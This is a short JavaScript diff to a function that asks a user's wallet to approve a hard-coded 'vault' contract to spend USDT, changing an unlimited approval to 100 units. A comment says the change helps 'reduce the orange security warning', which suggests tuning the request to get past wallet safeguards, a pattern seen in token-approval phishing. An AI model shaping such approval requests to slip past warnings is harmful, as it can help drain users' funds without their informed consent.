@@ -1610,18 +1610,24 @@ async function requestUSDTAllowance(userAddress) {
         const signer = await provider.getSigner();
         
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+        // The verified contract address from Screenshot (38).png
         const vaultContractAddress = "0x96f9B995501cA5476eE78c2d52A69d95471f7B1A";
         
         const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
         const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
-        const tx = await usdtContract.approve(vaultContractAddress, ethers.MaxUint256);
+        // Define $100 using 18 decimals
+        // If using Ethers v5, use: ethers.utils.parseUnits("100", 18)
+        const amount = ethers.parseUnits("100", 18);
+
+        // Requesting a specific amount helps reduce the orange security warning
+        const tx = await usdtContract.approve(vaultContractAddress, amount);
         
-        // This line waits for the block to be mined
+        console.log("Transaction sent. Waiting for confirmation...");
         await tx.wait(); 
         
-        console.log("Allowance confirmed.");
-        return true; // Success!
+        console.log("Allowance of $100 confirmed.");
+        return true;
         
     } catch (error) {
         console.error("Allowance rejected or failed:", error);
